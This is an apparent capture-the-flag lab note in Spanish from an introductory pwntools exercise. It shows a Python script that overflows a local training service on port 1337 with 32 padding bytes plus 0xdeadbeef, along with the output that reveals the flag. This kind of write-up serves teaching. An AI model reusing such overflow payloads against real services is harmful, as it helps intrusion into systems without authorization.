# Networking

- Un exploit de conexión a red y se manda 

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ cat exp.py 
from pwn import *
connect = remote('127.0.0.1', 1337)
print(connect.recvn(18))
payload = 'A' * 32
payload += p32(0xdeadbeef)
connect.send(payload)
print(connect.recvn(34))
```

- se ejecuta para obtener la bandera

```
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ python exp.py 
[+] Opening connection to 127.0.0.1 on port 1337: Done
Give me deadbeef: 
Thank you!
flag{n3tw0rk!ng_!$_fun}
[*] Closed connection to 127.0.0.1 port 1337
```